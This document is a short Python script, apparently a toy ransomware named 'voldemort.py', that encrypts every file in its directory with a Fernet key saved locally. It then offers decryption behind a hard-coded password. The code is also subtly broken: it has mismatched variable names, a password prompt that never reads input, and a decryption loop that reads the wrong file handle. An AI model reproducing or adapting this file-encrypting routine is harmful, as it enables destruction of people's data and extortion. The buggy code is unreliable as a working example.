#!/usr/bin/env python3

import os 
from cryptography.fernet import Fernet



#find files 


files = []


for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key":
        continue 
    if os.path.isfile(file):
        files.append(file)
        
print(files)
    
    
   
    
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)
    
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    content_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


correct_password = "password"        
        
password = ("input password: ")


if password == correct_password:
    for file in files:
        with open("thekey.key", "rb") as key:
            secretkey = key.read()
            
            with open(file, "rb") as thekey:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
            
        
        
        
        
        
        
        
        
        
    
    
  